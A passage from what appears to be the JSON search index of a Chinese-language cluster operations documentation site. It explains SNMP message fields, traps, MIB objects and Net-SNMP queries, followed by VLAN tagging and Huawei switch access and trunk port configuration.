\u4e4b\u95f4\u5b8c\u6210\u8ba4\u8bc1\uff0c\u5b57\u7b26\u4e32\u5f62\u5f0f\uff0c\u7528\u6237\u53ef\u81ea\u884c\u5b9a\u4e49\u3002\u56e2\u4f53\u540d\u5305\u62ec\u201cread\u201d\u548c\u201cwrite\u201d\u4e24\u79cd\uff0c\u6267\u884c SNMP \u67e5\u8be2\u64cd\u4f5c\u65f6\uff0c\u91c7\u7528\u201cread\u201d\u56e2\u4f53\u540d\u8fdb\u884c\u8ba4\u8bc1\uff1b\u6267\u884c SNMP \u8bbe\u7f6e\u64cd\u4f5c\u65f6\uff0c\u5219\u91c7\u7528\u201cwrite\u201d\u56e2\u4f53\u540d\u8fdb\u884c\u8ba4\u8bc1\u3002</li> <li>Request ID\uff1a\u7528\u4e8e\u5339\u914d\u8bf7\u6c42\u548c\u54cd\u5e94\uff0cSNMP \u7ed9\u6bcf\u4e2a\u8bf7\u6c42\u5206\u914d\u5168\u5c40\u552f\u4e00\u7684 ID\u3002</li> <li>Non repeaters/Max repetitions\uff1aGetBulk \u64cd\u4f5c\u57fa\u4e8e GetNext \u64cd\u4f5c\u5b9e\u73b0\uff0c\u76f8\u5f53\u4e8e\u591a\u6b21\u6267\u884c GetNext \u64cd\u4f5c\uff0c\u8fd9\u4e24\u4e2a\u53c2\u6570\u7528\u4e8e\u8bbe\u7f6e\u6267\u884c GetNext \u64cd\u4f5c\u6b21\u6570\u3002</li> <li>Error status\uff1a\u7528\u4e8e\u8868\u793a\u5728\u5904\u7406\u8bf7\u6c42\u65f6\u51fa\u73b0\u7684\u72b6\u51b5\u3002</li> <li>Error index\uff1a\u5dee\u9519\u7d22\u5f15\u3002\u5f53\u51fa\u73b0\u5f02\u5e38\u60c5\u51b5\u65f6\uff0c\u63d0\u4f9b\u53d8\u91cf\u7ed1\u5b9a\u5217\u8868\uff08Variable bindings\uff09\u4e2d\u5bfc\u81f4\u5f02\u5e38\u7684\u53d8\u91cf\u7684\u4fe1\u606f\u3002</li> <li>Variable bindings\uff1a\u53d8\u91cf\u7ed1\u5b9a\u5217\u8868\uff0c\u7531\u53d8\u91cf\u540d\u548c\u53d8\u91cf\u503c\u5bf9\u7ec4\u6210\u3002</li> </ul>","tags":["help"]},{"location":"operation/network/network-technology/snmp/#snmp-trap","title":"SNMP Trap","text":"<p>SNMP Traps \u662f\u6307 SNMP Agent \u4e3b\u52a8\u5c06\u8bbe\u5907\u4ea7\u751f\u7684\u544a\u8b66\u6216\u4e8b\u4ef6\u4e0a\u62a5\u7ed9 NMS\uff0c\u4ee5\u4fbf\u7f51\u7edc\u7ba1\u7406\u5458\u53ca\u65f6\u4e86\u89e3\u8bbe\u5907\u5f53\u524d\u8fd0\u884c\u7684\u72b6\u6001\u3002</p> <p>SNMP Agent \u4e0a\u62a5 SNMP Traps \u6709\u4e24\u79cd\u65b9\u5f0f\uff1aTrap \u548c Inform\u3002SNMPv1 \u7248\u672c\u4e0d\u652f\u6301 Inform\u3002Trap \u548c Inform \u7684\u533a\u522b\u5728\u4e8e\uff0cSNMP Agent \u901a\u8fc7 Inform \u5411 NMS \u53d1\u9001\u544a\u8b66\u6216\u4e8b\u4ef6\u540e\uff0cNMS \u9700\u8981\u56de\u590d InformResponse \u8fdb\u884c\u786e\u8ba4\u3002</p> <p>Trap \u4e0d\u5c5e\u4e8e NMS \u5bf9\u88ab\u7ba1\u7406\u8bbe\u5907\u7684\u57fa\u672c\u64cd\u4f5c\uff0c\u5b83\u662f\u88ab\u7ba1\u7406\u8bbe\u5907\u7684\u81ea\u53d1\u884c\u4e3a\u3002\u5f53\u88ab\u7ba1\u7406\u8bbe\u5907\u8fbe\u5230\u544a\u8b66\u7684\u89e6\u53d1\u6761\u4ef6\u65f6\uff0c\u4f1a\u901a\u8fc7 SNMP Agent \u5411 NMS \u53d1\u9001 Trap \u6d88\u606f\uff0c\u544a\u77e5\u8bbe\u5907\u4fa7\u51fa\u73b0\u7684\u5f02\u5e38\u60c5\u51b5\uff0c\u4fbf\u4e8e\u7f51\u7edc\u7ba1\u7406\u4eba\u5458\u53ca\u65f6\u5904\u7406\u3002\u4f8b\u5982\u88ab\u7ba1\u7406\u8bbe\u5907\u70ed\u542f\u52a8\u540e\uff0cSNMP Agent \u4f1a\u5411 NMS \u53d1\u9001 warmStart \u7684 Trap\u3002</p> <p>\u8fd9\u79cd Trap \u4fe1\u606f\u662f\u53d7\u9650\u5236\u7684\u3002\u53ea\u6709\u5728\u8bbe\u5907\u7aef\u7684\u6a21\u5757\u8fbe\u5230\u6a21\u5757\u9884\u5b9a\u4e49\u7684\u544a\u8b66\u89e6\u53d1\u6761\u4ef6\u65f6\uff0cSNMP Agent \u624d\u4f1a\u5411\u7ba1\u7406\u8fdb\u7a0b\u62a5\u544a\u3002\u8fd9\u79cd\u65b9\u6cd5\u7684\u597d\u5904\u662f\u4ec5\u5728\u4e25\u91cd\u4e8b\u4ef6\u53d1\u751f\u65f6\u624d\u53d1\u9001 Trap \u4fe1\u606f\uff0c\u51cf\u5c11\u62a5\u6587\u4ea4\u4e92\u4ea7\u751f\u7684\u6d41\u91cf\u3002</p>","tags":["help"]},{"location":"operation/network/network-technology/snmp/#mib-\u8be6\u89e3","title":"MIB \u8be6\u89e3","text":"<p>Quote</p> <ul> <li>S200, S300, S500, S1700, S2700, S5700, S6700 V200R023C00 MIB \u53c2\u8003 - \u534e\u4e3a</li> <li>Support - 01-MIB overview- H3C</li> </ul> <p>MIB \u5b9a\u4e49\u88ab\u7ba1\u7406\u5bf9\u8c61\u7684\u4e00\u7cfb\u5217\u5c5e\u6027\uff0c\u5305\u62ec</p> <ul> <li>\u5bf9\u8c61\u7684\u540d\u5b57</li> <li>\u5bf9\u8c61\u7684\u8bbf\u95ee\u6743\u9650</li> <li>\u5bf9\u8c61\u7684\u6570\u636e\u7c7b\u578b</li> </ul> <p>\u7ba1\u7406\u4fe1\u606f\u7ed3\u6784 SMI\uff08Structure of Management Information\uff09\u89c4\u5b9a\u4e86\u88ab\u7ba1\u7406\u7684\u5bf9\u8c61\u5e94\u8be5\u5982\u4f55\u5b9a\u4e49\u548c\u7ec4\u7ec7\uff0c\u5b83\u5b9a\u4e49\u4e86\u4e00\u7cfb\u5217 MIB \u53ef\u4ee5\u4f7f\u7528\u7684\u6570\u636e\u7c7b\u578b\uff0c\u6bd4\u5982 Counter\u3001Gauge \u7b49\u3002</p> <p>MIB \u6587\u4ef6\u4e00\u65e6\u53d1\u5e03\uff0cOID \u5c31\u548c\u88ab\u5b9a\u4e49\u7684\u5bf9\u8c61\u7ed1\u5b9a\uff0c\u4e0d\u80fd\u4fee\u6539\u3002MIB \u8282\u70b9\u4e0d\u80fd\u88ab\u5220\u9664\uff0c\u53ea\u80fd\u5c06\u5b83\u7684\u72b6\u6001\u7f6e\u4e3a\u201cobsolete\u201d\uff0c\u8868\u660e\u8be5\u8282\u70b9\u5df2\u7ecf\u88ab\u5e9f\u9664\u3002</p> <p>MIB \u53ef\u4ee5\u5206\u4e3a\u516c\u6709 MIB \u548c\u79c1\u6709 MIB \u4e24\u79cd\u3002</p> <ul> <li>\u516c\u6709 MIB\uff1a\u4e00\u822c\u7531 RFC \u5b9a\u4e49\uff0c\u4e3b\u8981\u7528\u6765\u5bf9\u5404\u79cd\u516c\u6709\u534f\u8bae\u8fdb\u884c\u7ed3\u6784\u5316\u8bbe\u8ba1\u548c\u63a5\u53e3\u6807\u51c6\u5316\u5904\u7406\u3002\u5927\u591a\u6570\u7684\u8bbe\u5907\u5236\u9020\u5546\u90fd\u9700\u8981\u6309\u7167 RFC \u7684\u5b9a\u4e49\u6765\u63d0\u4f9b SNMP \u63a5\u53e3\u3002</li> <li>\u79c1\u6709 MIB\uff1a\u662f\u516c\u6709 MIB \u7684\u5fc5\u8981\u8865\u5145\uff0c\u5f53\u516c\u53f8\u81ea\u884c\u5f00\u53d1\u79c1\u6709\u534f\u8bae\u6216\u8005\u7279\u6709\u529f\u80fd\u65f6\uff0c\u53ef\u4ee5\u5229\u7528\u79c1\u6709 MIB \u6765\u5b8c\u5584 SNMP \u63a5\u53e3\u7684\u7ba1\u7406\u529f\u80fd\uff0c\u540c\u65f6\u5bf9\u7b2c\u4e09\u65b9\u7f51\u7ba1\u8f6f\u4ef6\u7ba1\u7406\u5b58\u5728\u79c1\u6709\u534f\u8bae\u6216\u7279\u6709\u529f\u80fd\u7684\u8bbe\u5907\u63d0\u4f9b\u652f\u6301\u3002</li> </ul> <p>MIB \u5bf9\u8c61\u5206\u4e3a\u4e09\u7c7b\uff1a</p> <ul> <li>\u6807\u91cf\u5bf9\u8c61\uff08Scalar Object\uff09\uff1a\u53ea\u6709\u4e00\u4e2a\u5b9e\u4f8b\uff0c\u5982\u7cfb\u7edf\u540d\u79f0\u3001\u7cfb\u7edf\u63cf\u8ff0\u7b49\u3002<ul> <li>\u8981\u8bbf\u95ee\u6807\u91cf\u5bf9\u8c61\uff0c\u5fc5\u987b\u5728\u6807\u91cf\u5bf9\u8c61\u540e\u52a0\u4e0a\u7d22\u5f15 <code>.0</code> \u8868\u793a\u8fd9\u4e2a\u6807\u91cf\u5bf9\u8c61\u7684\u552f\u4e00\u5b9e\u4f8b\u3002</li> </ul> </li> <li>\u8868\u5bf9\u8c61\uff08Table Object\uff09\uff1a\u5c06\u591a\u4e2a\u76f8\u5173\u7684\u5bf9\u8c61\u7ec4\u7ec7\u6210\u8868\u3002<ul> <li>\u5728\u8868\u4e2d\uff0c\u6bcf\u4e00\u5217\u662f\u5bf9\u8c61\uff0c\u6bcf\u4e00\u884c\u662f\u5b83\u4eec\u7684\u5b9e\u4f8b\u3002</li> <li>\u5217\u5bf9\u8c61\uff08Column Object\uff09\uff1a\u8868\u4e2d\u7684\u6bcf\u4e00\u5217\u3002</li> </ul> </li> </ul> <pre><code>PDU-MIB DEFINITIONS ::= BEGIN\nIMPORTS\nenterprises, Counter,\nTimeTicks, Gauge FROM RFC1155-SMI\nOBJECT-TYPE FROM RFC-1212\n\nsysUpTime, DisplayString FROM RFC1213-MIB\nTRAP-TYPE FROM RFC-1215;\npdu OBJECT IDENTIFIER ::= { enterprises 42578 }\npdu1 OBJECT IDENTIFIER ::= { pdu 1 }\npdu2 OBJECT IDENTIFIER ::= { pdu 2 }\npdu3 OBJECT IDENTIFIER ::= { pdu 3 }\npdu4 OBJECT IDENTIFIER ::= { pdu 4 }\npdu5 OBJECT IDENTIFIER ::= { pdu 5 }\n\nbaseinfo1 OBJECT IDENTIFIER ::= { pdu1 1 }\n\ncascadeAlarmPDU1 OBJECT-TYPE\nSYNTAX INTEGER (0..3)\nACCESS read-only\nSTATUS optional\nDESCRIPTION\n        \" \"\n::= { baseinfo1 1 }\n\ndeviceNamePDU1 OBJECT-TYPE\nSYNTAX DisplayString (SIZE (32))\nACCESS read-write\nSTATUS optional\nDESCRIPTION\n        \" \"\n::= { baseinfo1 2 }\n</code></pre>","tags":["help"]},{"location":"operation/network/network-technology/snmp/#snmp-\u5b9e\u8df5","title":"SNMP \u5b9e\u8df5","text":"<p>\u62a5\u6587\u793a\u4f8b\u8bf7\u67e5\u770b\u53c2\u8003\u94fe\u63a5\u4e2d\u534e\u4e3a\u7684\u4ecb\u7ecd\u6587\u7ae0\uff0c\u4e0b\u9762\u7684\u5b9e\u8df5\u73af\u8282\u4e0d\u4f1a\u6f14\u793a\u6293\u5305\u3002</p>","tags":["help"]},{"location":"operation/network/network-technology/snmp/#\u4f7f\u7528-net-snmp","title":"\u4f7f\u7528 Net-SNMP","text":"<p>Net-SNMP \u662f\u4e00\u4e2a\u5f00\u6e90\u7684 SNMP \u5de5\u5177\u5305\uff0c\u63d0\u4f9b\u4e86\u5168\u9762\u7684 SNMP \u529f\u80fd\uff1a</p> <ul> <li>\u547d\u4ee4\u884c\u5de5\u5177 <code>snmpwalk</code>\u3001<code>snmpget</code>\u3001<code>snmpset</code> \u7b49\u3002</li> <li><code>snmptrapd</code> \u5b88\u62a4\u8fdb\u7a0b\uff0c\u7528\u4e8e\u63a5\u6536 SNMP Trap\u3002</li> <li><code>snmpd</code> \u5b88\u62a4\u8fdb\u7a0b\uff0c\u7528\u4e8e\u63d0\u4f9b SNMP \u670d\u52a1\u3002</li> <li>C \u548c Perl API\uff0c\u7528\u4e8e\u5f00\u53d1\u81ea\u5b9a\u4e49\u7684 SNMP \u7a0b\u5e8f\u3002</li> </ul> <p>\u5176\u4e2d <code>snmpwalk</code> \u662f\u6700\u5e38\u89c1\u7684 SNMP \u67e5\u8be2\u5de5\u5177\u3002\u4e0b\u9762\u4ee5\u667a\u80fd PDU \u4e3a\u4f8b\uff0c\u6f14\u793a\u5982\u4f55\u4f7f\u7528 <code>snmpwalk</code> \u67e5\u8be2\u8bbe\u5907\u4fe1\u606f\uff1a</p> <pre><code>$ snmpwalk -v3 -l authPriv -u &lt;username&gt; -a MD5 -A &lt;auth_key&gt; -x DES -X &lt;priv_key1&gt; &lt;device_ip&gt;\niso.3.6.1.2.1.1.1.0 = STRING: \"DG-352-IP HV1.00 SV1.36 WV1.38\"\niso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.42578\niso.3.6.1.2.1.1.3.0 = Timeticks: (1219) 0:00:12.19\niso.3.6.1.2.1.1.4.0 = STRING: \"zjusct\"\niso.3.6.1.2.1.1.5.0 = STRING: \"pdu3\"\niso.3.6.1.2.1.1.6.0 = STRING: \"rack3\"\niso.3.6.1.2.1.1.7.0 = INTEGER: 4\n$ snmpset -v3 &lt;auth&gt; &lt;device_ip&gt; &lt;oid&gt; s pdu1\niso.3.6.1.2.1.1.5.0 = STRING: \"pdu1\"\n</code></pre> <p>\u96c6\u7fa4\u4e2d\u7684\u57fa\u7840\u8bbe\u65bd\u5747\u652f\u6301 SNMPv3\uff0c\u4e14\u91c7\u7528\u7684\u8ba4\u8bc1\u65b9\u5f0f\u5927\u591a\u4e3a MD5 \u548c DES\u3002</p>","tags":["help"]},{"location":"operation/network/network-technology/snmp/#\u5728-oid-info-\u67e5\u8be2-mib-\u4fe1\u606f","title":"\u5728 oid-info \u67e5\u8be2 MIB \u4fe1\u606f","text":"<p>\u5bf9\u4e8e\u4e0a\u9762\u7684\u67e5\u8be2\u7ed3\u679c\uff0c\u53ef\u4ee5\u5728 oid-info \u7f51\u7ad9\u4e0a\u67e5\u8be2\u5230\u5bf9\u5e94\u7684 MIB \u4fe1\u606f\u3002\u4ee5\u7b2c\u4e00\u884c\u4e3a\u4f8b\uff0c<code>iso</code> \u5bf9\u5e94\u7684 OID \u4e3a 1\uff0c\u67e5\u8be2 <code>1.3.6.1.2.1.1.1</code> \u53ef\u4ee5\u5f97\u5230\u5982\u4e0b\u7ed3\u679c\uff1a</p> <pre><code>{iso(1) identified-organization(3) dod(6) internet(1) mgmt(2) mib-2(1) system(1) sysDescr(1)}\nsysDescr OBJECT-TYPE\nSYNTAX DisplayString (SIZE (0..255))\nMAX-ACCESS read-only\nSTATUS current\nDESCRIPTION\n\"A textual description of the entity. This value should\ninclude the full name and version identification of\nthe system's hardware type, software operating-system,\nand networking software.\"\n</code></pre> <p>\u53ef\u4ee5\u770b\u51fa\uff0c\u8fd9\u662f\u4e00\u4e2a\u6807\u91cf\u5bf9\u8c61\uff0c\u53ea\u6709\u4e00\u4e2a\u5b9e\u4f8b\uff0c\u901a\u8fc7 <code>sysDescr.0</code> \u8bbf\u95ee\u3002</p>","tags":["help"]},{"location":"operation/network/network-technology/vlan/","title":"VLAN","text":"","tags":["stable"]},{"location":"operation/network/network-technology/vlan/#vlan","title":"VLAN","text":"<p>Quote</p> <ul> <li>\u3010\u4ea4\u6362\u673a\u5728\u6c5f\u6e56\u3011\u7b2c\u5341\u4e8c\u7ae0 VLAN \u57fa\u7840\u7bc7 - \u534e\u4e3a</li> <li>\u65e0\u7ebf\u63a5\u5165\u63a7\u5236\u5668 (AC \u548c FITAP) \u4ea7\u54c1\u6587\u6863 - \u534e\u4e3a</li> <li>VLAN \u6280\u672f\u6307\u5bfc - \u534e\u4e3a</li> <li>\u4e00\u4e2a\u89c6\u9891\uff0c\u5f7b\u5e95\u641e\u6e05 tag untag pvid vid access trunk \u8fd9\u4e9b\u6982\u5ff5\u7684\u533a\u522b\u548c\u8054\u7cfb\uff01 - Bilibili</li> </ul>","tags":["stable"]},{"location":"operation/network/network-technology/vlan/#vlan-\u7b80\u4ecb","title":"VLAN \u7b80\u4ecb","text":"<p>\u4ee5\u592a\u7f51\u4ea4\u6362\u57fa\u7840</p> <p>\u4e8c\u5c42\u3001\u4e09\u5c42\u4ea4\u6362\u539f\u7406\u5728\u6b64\u7565\u8fc7\u3002\u5982\u679c\u4f60\u5bf9\u4e0b\u9762\u4e24\u5f20\u56fe\u7684\u5185\u5bb9\u4e0d\u719f\u6089\uff0c\u5efa\u8bae\u67e5\u9605\u76f8\u5173\u8d44\u6599\u3002</p> <p></p> \u4e8c\u5c42\u4ea4\u6362 \u4e09\u5c42\u4ea4\u6362 <p></p> <p>VLAN\uff08Virtual Local Area Network\uff09\u5373\u865a\u62df\u5c40\u57df\u7f51\uff0c\u662f\u5c06\u4e00\u4e2a\u7269\u7406\u7684 LAN \u5728\u903b\u8f91\u4e0a\u5212\u5206\u6210\u591a\u4e2a\u5e7f\u64ad\u57df\u7684\u901a\u4fe1\u6280\u672f\u3002\u6bcf\u4e2a VLAN \u662f\u4e00\u4e2a\u5e7f\u64ad\u57df\uff0cVLAN \u5185\u7684\u4e3b\u673a\u95f4\u901a\u4fe1\u5c31\u548c\u5728\u4e00\u4e2a LAN \u5185\u4e00\u6837\uff0c\u800c VLAN \u95f4\u5219\u4e0d\u80fd\u76f4\u63a5\u4e92\u901a\uff0c\u8fd9\u6837\uff0c\u5e7f\u64ad\u62a5\u6587\u5c31\u88ab\u9650\u5236\u5728\u4e00\u4e2a VLAN \u5185\u3002</p> VLAN \u793a\u610f\u56fe","tags":["stable"]},{"location":"operation/network/network-technology/vlan/#vlan-tag","title":"VLAN Tag","text":"<p>\u8981\u4f7f\u4ea4\u6362\u673a\u80fd\u591f\u5206\u8fa8\u4e0d\u540c VLAN \u7684\u62a5\u6587\uff0c\u9700\u8981\u5728\u62a5\u6587\u4e2d\u6dfb\u52a0\u6807\u8bc6 VLAN \u4fe1\u606f\u7684\u5b57\u6bb5\u3002IEEE 802.1Q \u534f\u8bae\u89c4\u5b9a\uff0c\u5728\u4ee5\u592a\u7f51\u6570\u636e\u5e27\u7684\u76ee\u7684 MAC \u5730\u5740\u548c\u6e90 MAC \u5730\u5740\u5b57\u6bb5\u4e4b\u540e\u3001\u534f\u8bae\u7c7b\u578b\u5b57\u6bb5\u4e4b\u524d\u52a0\u5165 4 \u4e2a\u5b57\u8282\u7684 VLAN \u6807\u7b7e\uff08\u53c8\u79f0 VLAN Tag\uff0c\u7b80\u79f0 Tag\uff09\uff0c\u7528\u4ee5\u6807\u8bc6 VLAN \u4fe1\u606f\u3002VLAN \u6570\u636e\u5e27\u683c\u5f0f\u5982\u56fe 2 \u6240\u793a\u3002</p> VLAN \u6570\u636e\u5e27\u683c\u5f0f <p>\u5176\u4e2d\uff0c\u6570\u636e\u5e27\u4e2d\u7684 VID\uff08VLAN ID\uff09\u5b57\u6bb5\u6807\u8bc6\u4e86\u8be5\u6570\u636e\u5e27\u6240\u5c5e\u7684 VLAN\uff0c\u6570\u636e\u5e27\u53ea\u80fd\u5728\u5176\u6240\u5c5e VLAN \u5185\u8fdb\u884c\u4f20\u8f93\u3002</p>","tags":["stable"]},{"location":"operation/network/network-technology/vlan/#vlan-\u5212\u5206","title":"VLAN \u5212\u5206","text":"<p>\u6ce8\u610f\u4e8b\u9879</p> <p>\u7531\u4e8e\u8bbe\u5907\u6240\u6709\u7684\u63a5\u53e3\u90fd\u9ed8\u8ba4\u52a0\u5165 VLAN1\uff0c\u56e0\u6b64\u5f53\u7f51\u7edc\u4e2d\u5b58\u5728 VLAN1 \u7684\u672a\u77e5\u5355\u64ad\u3001\u7ec4\u64ad\u6216\u8005\u5e7f\u64ad\u62a5\u6587\u65f6\uff0c\u53ef\u80fd\u4f1a\u5f15\u8d77\u5e7f\u64ad\u98ce\u66b4\u3002\u5bf9\u4e8e\u4e0d\u9700\u8981\u52a0\u5165 VLAN1 \u7684\u63a5\u53e3\u53ca\u65f6\u9000\u51fa VLAN1\uff0c\u907f\u514d\u73af\u8def\u3002</p> <ul> <li>\u6267\u884c\u547d\u4ee4 <code>vlan vlan-id</code>\uff0c\u521b\u5efa VLAN \u5e76\u8fdb\u5165 VLAN \u89c6\u56fe\u3002</li> <li>\u4f7f\u7528 <code>vlan batch</code> \u547d\u4ee4\u53ef\u4ee5\u6279\u91cf\u521b\u5efa\u591a\u4e2a VLAN\u3002\u5982\u679c\u8be5 VLAN \u5df2\u7ecf\u5b58\u5728\uff0c\u4e0d\u4f1a\u518d\u91cd\u65b0\u521b\u5efa\uff0c\u4fdd\u7559\u539f\u6765\u7684 VLAN \u53ca\u5176\u76f8\u5173\u914d\u7f6e\u3002</li> </ul> <pre><code>&lt;HUAWEI&gt; system-view\n[HUAWEI] vlan 100\n[HUAWEI-vlan100] quit\n[HUAWEI] display vlan summary\nStatic VLAN:\nTotal 2 static VLAN.\n1 100\n\nDynamic VLAN:\nTotal 0 dynamic VLAN.\n\nReserved VLAN:\nTotal 0 reserved VLAN.\n</code></pre>","tags":["stable"]},{"location":"operation/network/network-technology/vlan/#vlan-\u63a5\u53e3","title":"VLAN \u63a5\u53e3","text":"<ul> <li>Access \u63a5\u53e3\uff1a\u5bf9\u4e8e\u4ea4\u6362\u673a\u6765\u8bf4\uff0c\u5176\u5185\u90e8\u5904\u7406\u7684\u6570\u636e\u5e27\u90fd\u5e26\u6709 VLAN \u6807\u7b7e\uff0c\u800c\u73b0\u7f51\u4e2d\u4ea4\u6362\u673a\u8fde\u63a5\u7684\u8bbe\u5907\u6709\u4e9b\u53ea\u4f1a\u6536\u53d1 Untagged \u5e27\uff0c\u8981\u4e0e\u8fd9\u4e9b\u8bbe\u5907\u4ea4\u4e92\uff0c\u5c31\u9700\u8981\u63a5\u53e3\u80fd\u591f\u8bc6\u522b Untagged \u5e27\u5e76\u5728\u6536\u53d1\u65f6\u7ed9\u5e27\u6dfb\u52a0\u3001\u5265\u9664 VLAN \u6807\u7b7e\u3002</li> <li>Trunk \u63a5\u53e3\uff1a\u540c\u65f6\uff0c\u73b0\u7f51\u4e2d\u5c5e\u4e8e\u540c\u4e00\u4e2a VLAN \u7684\u7528\u6237\u53ef\u80fd\u4f1a\u88ab\u8fde\u63a5\u5728\u4e0d\u540c\u7684\u4ea4\u6362\u673a\u4e0a\uff0c\u4e14\u8de8\u8d8a\u4ea4\u6362\u673a\u7684 VLAN \u53ef\u80fd\u4e0d\u6b62\u4e00\u4e2a\uff0c\u5982\u679c\u9700\u8981\u7528\u6237\u95f4\u7684\u4e92\u901a\uff0c\u5c31\u9700\u8981\u4ea4\u6362\u673a\u95f4\u7684\u63a5\u53e3\u80fd\u591f\u540c\u65f6\u8bc6\u522b\u548c\u53d1\u9001\u591a\u4e2a VLAN \u7684\u6570\u636e\u5e27\u3002</li> </ul> \u4e0d\u540c VLAN \u63a5\u53e3\u5bf9\u6570\u636e\u5e27\u7684\u5904\u7406\u65b9\u5f0f <p>\u4e0d\u540c\u4ea7\u5546\u5bf9 VLAN \u7684\u63a5\u53e3\u5b9a\u4e49\u6709\u6240\u4e0d\u540c\uff0c\u4e0b\u9762\u4ecb\u7ecd\u4e86\u534e\u4e3a\u548c TP-Link \u7684 VLAN \u63a5\u53e3\u5b9a\u4e49\u3002</p> \u534e\u4e3aTP-Link <p>\u6839\u636e\u63a5\u53e3\u8fde\u63a5\u5bf9\u8c61\u4ee5\u53ca\u5bf9\u6536\u53d1\u6570\u636e\u5e27\u5904\u7406\u7684\u4e0d\u540c\uff0c\u534e\u4e3a\u5b9a\u4e49\u4e86 3 \u79cd\u63a5\u53e3\u7684\u94fe\u8def\u7c7b\u578b\uff1aAccess\u3001Trunk \u548c Hybrid\uff0c\u4ee5\u9002\u5e94\u4e0d\u540c\u7684\u8fde\u63a5\u548c\u7ec4\u7f51\uff1a</p> \u63a5\u53e3\u7c7b\u578b \u5bf9\u63a5\u6536\u4e0d\u5e26 Tag \u7684\u62a5\u6587\u5904\u7406 \u5bf9\u63a5\u6536\u5e26 Tag \u7684\u62a5\u6587\u5904\u7406 \u53d1\u9001\u5e27\u5904\u7406\u8fc7\u7a0b Access \u63a5\u53e3 \u63a5\u6536\u8be5\u62a5\u6587\uff0c\u5e76\u6253\u4e0a\u7f3a\u7701\u7684 VLAN ID\u3002 \u5f53 VLAN ID \u4e0e\u7f3a\u7701 VLAN ID \u76f8\u540c\u65f6\uff0c\u63a5\u6536\u8be5\u62a5\u6587\uff0c\u5426\u5219\u4e22\u5f03\u8be5\u62a5\u6587\u3002 \u5148\u5265\u79bb\u5e27\u7684 PVID Tag\uff0c\u7136\u540e\u518d\u53d1\u9001\u3002 Trunk \u63a5\u53e3 \u6253\u4e0a\u7f3a\u7701\u7684 VLAN ID\uff0c\u5f53\u7f3a\u7701 VLAN ID \u5728\u5141\u8bb8\u901a\u8fc7\u7684 VLAN ID \u5217\u8868\u91cc\u65f6\uff0c\u63a5\u6536\u8be5\u62a5\u6587\uff0c\u5426\u5219\u4e22\u5f03\u8be5\u62a5\u6587\u3002 \u5f53 VLAN ID \u5728\u63a5\u53e3\u5141\u8bb8\u901a\u8fc7\u7684 VLAN ID \u5217\u8868\u91cc\u65f6\uff0c\u63a5\u6536\u8be5\u62a5\u6587\uff0c\u5426\u5219\u4e22\u5f03\u8be5\u62a5\u6587\u3002 \u5f53 VLAN ID \u4e0e\u7f3a\u7701 VLAN ID \u76f8\u540c\uff0c\u4e14\u662f\u8be5\u63a5\u53e3\u5141\u8bb8\u901a\u8fc7\u7684 VLAN ID \u65f6\uff0c\u53bb\u6389 Tag\uff0c\u53d1\u9001\u8be5\u62a5\u6587\u3002\u5f53 VLAN ID \u4e0e\u7f3a\u7701 VLAN ID \u4e0d\u540c\uff0c\u4e14\u662f\u8be5\u63a5\u53e3\u5141\u8bb8\u901a\u8fc7\u7684 VLAN ID \u65f6\uff0c\u4fdd\u6301\u539f\u6709 Tag\uff0c\u53d1\u9001\u8be5\u62a5\u6587\u3002 Hybrid \u63a5\u53e3 \u540c Trunk\u3002 \u540c Trunk\u3002 \u5f53 VLAN ID \u662f\u8be5\u63a5\u53e3\u5141\u8bb8\u901a\u8fc7\u7684 VLAN ID \u65f6\uff0c\u53d1\u9001\u8be5\u62a5\u6587\u3002\u53ef\u4ee5\u901a\u8fc7\u547d\u4ee4\u8bbe\u7f6e\u53d1\u9001\u65f6\u662f\u5426\u643a\u5e26 Tag\u3002 <p>\u6211\u4eec\u6301\u6709\u7684\u4e24\u53f0 TP-Link \u4ea4\u6362\u673a\uff0c\u6240\u6709\u7aef\u53e3\u5747\u4e3a GENERAL\uff0c\u53ef\u4ee5\u914d\u7f6e\u4e3a tagged \u548c untagged\u3002</p> <p> \u7aef\u53e3\u7c7b\u578b \u63a5\u6536\u62a5\u6587 \u53d1\u9001\u62a5\u6587 \u4e0d\u5e26 Tag \u5e26 Tag ACCESS \u6dfb\u52a0\u7f3a\u7701\u7684 VLAN Tag\uff0c\u5373\u8f93\u5165\u7aef PVID \u5f53 VID = PVID\uff0c\u63a5\u6536\uff0c\u5426\u5219\u4e22\u5f03 \u53bb\u6389 Tag TRUNK \u5f53 VID \u5c5e\u4e8e\u5141\u8bb8\u901a\u8fc7\u7684 VLAN ID \u65f6\uff0c\u63a5\u6536\uff0c\u5426\u5219\u4e22\u5f03 \u4fdd\u6301\u539f\u6709 Tag GENERAL \u914d\u7f6e\u4e3a Tag \u65f6\uff0c\u4fdd\u6301\u539f\u6709 Tag\u914d\u7f6e\u4e3a Untagged \u65f6\uff0c\u53bb\u6389 Tag </p> <p>\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u63a5\u8bbe\u5907\u7684\u7aef\u53e3\u4e3a Access \u63a5\u53e3\uff0c\u63a5\u4ea4\u6362\u673a\u7684\u7aef\u53e3\u4e3a Trunk \u63a5\u53e3\u3002</p> AccessTrunkHybrid\u4f7f\u7528\u7aef\u53e3\u7ec4 port-group \u793a\u4f8b\u547d\u4ee4\u683c\u5f0f <pre><code>[HUAWEI] interface gigabitethernet 1/0/1\n[HUAWEI-GigabitEthernet1/0/1] port link-type access\n[HUAWEI-GigabitEthernet1/0/1] port default vlan 100\n[HUAWEI-GigabitEthernet1/0/1] quit\n[HUAWEI] display port vlan gigabitethernet 1/0/1\nPort                        Link Type    PVID  Trunk VLAN List\n-------------------------------------------------------------------------------\nGigabitEthernet1/0/1        access       100   -\n</code></pre> <pre><code>interface interface-type interface-number\nport link-type access\nport default vlan vlan-id\n</code></pre> \u793a\u4f8b\u547d\u4ee4\u683c\u5f0f <pre><code>[HUAWEI] interface gigabitethernet 1/0/2\n[HUAWEI-GigabitEthernet1/0/2] port link-type trunk\n[HUAWEI-GigabitEthernet1/0/2] port trunk allow-pass vlan 100\n[HUAWEI-GigabitEthernet1/0/2] quit\n[HUAWEI] display port vlan gigabitethernet 1/0/2\nPort                        Link Type    PVID  Trunk VLAN List\n-------------------------------------------------------------------------------\nGigabitEthernet1/0/2        trunk        1     1 100\n</code></pre> <pre><code>interface interface-type interface-number\nport link-type trunk\nport trunk allow-pass vlan { { vlan-id1 [ to vlan-id2 ] } &amp;&lt;1-10&gt; | all }\nport trunk pvid vlan vlan-id\n</code></pre> \u793a\u4f8b\u547d\u4ee4\u683c\u5f0f <pre><code>[HUAWEI] interface gigabitethernet 